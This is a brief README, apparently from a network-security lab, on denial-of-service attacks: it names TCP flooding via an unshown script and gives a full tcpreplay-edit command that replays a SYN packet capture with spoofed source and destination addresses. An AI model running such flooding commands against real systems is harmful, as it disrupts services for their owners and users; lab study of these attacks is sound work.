# Denial of Service (DoS)

We focus on two types of DoS attacks.

* TCP Flooding
* (Optional) SYN Flooding

## TCP Flooding

We simply use `flooding.py` to conduct our attack.

## SYN Flooding

```bash
$ sudo tcpreplay-edit --srcipmap=10.0.0.2:10.200.64.115 --destipmap=10.120.0.2:172.20.10.4 --enet-smac=88:66:5a:31:43:51 --enet-dmac=C0:2C:5C:2E:FE:6A --loop=1 en0 ./SYN.pcap
```

